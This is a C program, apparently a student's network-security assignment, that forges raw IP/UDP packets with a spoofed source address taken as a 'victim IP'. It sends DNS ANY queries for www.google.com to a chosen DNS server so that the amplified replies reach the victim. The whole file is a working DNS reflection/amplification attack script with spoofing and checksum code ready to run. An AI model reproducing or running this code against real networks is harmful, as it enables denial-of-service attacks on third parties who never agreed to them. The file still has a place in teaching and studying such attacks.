#include <stdio.h>
#include <string.h>
#include <malloc.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/in.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>

#define PCKT_LEN 8192
#define FLAG_Q 0x0100

#define DESTINATION_PORT    53


struct ipheader {
    unsigned char      iph_ihl:4, iph_ver:4;
    unsigned char      iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    unsigned short int iph_offset;
    unsigned char      iph_ttl;
    unsigned char      iph_protocol;
    unsigned short int iph_chksum;
    unsigned int       iph_sourceip;
    unsigned int       iph_destip;
};
struct udpheader {
    unsigned short int udph_srcport;
    unsigned short int udph_destport;
    unsigned short int udph_len;
    unsigned short int udph_chksum;
};
struct dnsheader {
    unsigned short int query_id;
    unsigned short int flags;
    unsigned short int QDCOUNT;
    unsigned short int ANCOUNT;
    unsigned short int NSCOUNT;
    unsigned short int ARCOUNT;
};
unsigned int checksum(uint16_t *usBuff, int isize){
    unsigned int cksum=0;
    for(;isize>1;isize-=2){
        cksum+=*usBuff++;
    }
    if(isize==1){
        cksum+=*(uint16_t *)usBuff;
    }
    return (cksum);
}
uint16_t check_udp_sum(uint8_t *buffer, int len){
    unsigned long sum=0;
    struct ipheader *tempI=(struct ipheader *)(buffer);
    struct udpheader *tempH=(struct udpheader *)(buffer+sizeof(struct ipheader));

    tempH->udph_chksum=0;
    sum=checksum( (uint16_t *)   &(tempI->iph_sourceip) ,8 );
    sum+=checksum((uint16_t *) tempH,len);
    sum+=ntohs(IPPROTO_UDP+len);
    sum=(sum>>16)+(sum & 0x0000ffff);
    sum+=(sum>>16);
    return (~sum);
}

unsigned short csum(unsigned short *buf, int nwords){
    unsigned long sum;
    for(sum=0; nwords>0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int main(int argc, char *argv[])
{
    if(argc != 4){
        printf("Invalid parameters!!!\nPlease enter <victim IP> <UDP Source port> <DNS Server IP>  \n");
        exit(-1);
    }
    printf("victim : %s\n", argv[1]);
    printf("port : %s\n", argv[2]);
    printf("DNS server : %s\n", argv[3]);

    int sd;
    char buffer[PCKT_LEN];
    memset(buffer, 0, PCKT_LEN);
    struct ipheader *ip = (struct ipheader *) buffer;
    struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));
    struct dnsheader *dns=(struct dnsheader*) (buffer +sizeof(struct ipheader)+sizeof(struct udpheader));
    char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));

    dns->flags   = htons(FLAG_Q);
    dns->QDCOUNT = htons(1);
    dns->query_id=0xE570; // transaction id for 0845168 Alexander Kjeldsen

    strcpy(data,"\3www\6google\3com");
    int length = strlen(data);
    data += strlen(data);
    *data = 0x00;
    data += 1;
    *data = 0x00;
    data += 1;
    *data = 0xFF;
    data += 1;
    *data = 0x00;
    data += 1;
    *data = 0x01;
    length = length + 5;

    struct sockaddr_in sin;
    int one = 1;
    const int *val = &one;

    // Create a raw socket with UDP protocol
    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);

    if(sd<0 )printf("socket error\n");
    sin.sin_family      = AF_INET;
    sin.sin_port        = htons(53);
    sin.sin_addr.s_addr = inet_addr(argv[3]);
    //ip
    ip->iph_ihl         = 5;
    ip->iph_ver         = 4;
    ip->iph_tos         = 0; // Low delay
    unsigned short int packetLength =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+length);
    ip->iph_len         = htons(packetLength);
    ip->iph_ident       = htons(0xE4CA);
    ip->iph_ttl         = 64; // hops
    ip->iph_protocol    = 17; // UDP
    ip->iph_sourceip    = inet_addr(argv[1]);
    ip->iph_destip      = inet_addr(argv[3]);
    //putting ports in udp
    udp->udph_srcport   = htons(atoi(argv[2]));
    udp->udph_destport  = htons(DESTINATION_PORT);
    udp->udph_len       = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+length);
    //checksum for ip and udp
    ip->iph_chksum      = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp->udph_chksum    = check_udp_sum((unsigned char*)&buffer, packetLength-sizeof(struct ipheader));

    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0 ){
        printf("error\n");
        exit(-1);
    }
    for(int i = 0; i<3;i++){
        printf("nr %i ", i+1);
        udp->udph_chksum=check_udp_sum((unsigned char*)&buffer, packetLength-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet
        if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0){
            printf("packet send error %d which means %s\n",errno,strerror(errno));
        } else {
            char sourceIpString[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &(ip->iph_sourceip), sourceIpString, INET_ADDRSTRLEN);
            char destinationIpString[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &(ip->iph_destip), destinationIpString, INET_ADDRSTRLEN);
            printf("source : %s", sourceIpString);
            printf(" : %d ", ntohs(udp->udph_srcport));
            printf("\t -> \t destination : %s", destinationIpString);
            printf(" : %d\n", htons(sin.sin_port));
        }
    }
    close(sd);
    return 0;
}